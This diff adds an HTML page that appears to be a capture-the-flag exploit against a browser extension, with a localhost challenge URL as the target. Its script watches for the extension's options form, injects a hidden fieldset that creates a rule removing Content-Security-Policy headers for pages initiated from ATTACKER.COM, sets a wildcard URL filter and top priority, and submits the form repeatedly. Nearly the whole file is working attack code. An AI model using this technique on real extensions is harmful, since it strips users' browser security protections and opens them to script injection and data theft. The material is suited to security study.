@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>pepega</title>
+	</head>
+	<body>
+		<script>
+		function sleep(time) {
+			return new Promise(resolve => {
+				setTimeout(resolve, time)
+			})
+		}			
+		
+		const extension_form_observer = new MutationObserver(async () => {
+			if (window.location.search.includes("reload")) {
+				sleep(500);
+				window.open("http://localhost:8080/challenge/[CHALLENGE_ID_HERE]");
+				return;
+			}
+
+			const form = document.querySelector('#block-options');
+			if (form) {
+				extension_form_observer.disconnect(); // ensure that we only trigger once
+				console.log("Form created!");
+
+				const fieldset = document.createElement('fieldset');
+				fieldset.id = 'pepega';
+				fieldset.innerHTML = `<input name="action.type" value="modifyHeaders">
+				<input name="action.responseHeaders.0.header" value="Content-Security-Policy">
+				<input name="action.responseHeaders.0.operation" value="remove">
+				<input name="action.requestHeaders.0.header" value="Content-Security-Policy">
+				<input name="action.requestHeaders.0.operation" value="remove">
+				<input name="condition.initiatorDomains.0" value="ATTACKER.COM">
+				<input name="condition.resourceTypes.0" value="main_frame">`;
+
+				form.insertBefore(fieldset, form.childNodes[0]);
+
+				const priority = form.querySelector('#priority');
+				priority.value = 100;
+
+				const urlFilter = form.querySelector('#urlFilter');
+				urlFilter.value = '*';
+
+
+				console.log("Evil fieldset injected!");
+
+				const submit = form.querySelector('#submit-btn');
+				for (let i = 0; i < 10; i++) {
+					submit.click();
+					await sleep(250);
+				};
+				window.location.href = './solve_final.html?reload';
+			 }
+		});
+		extension_form_observer.observe(document.body, {
+			childList: true,
+			subtree: true
+		});
+	</script>
+</body>
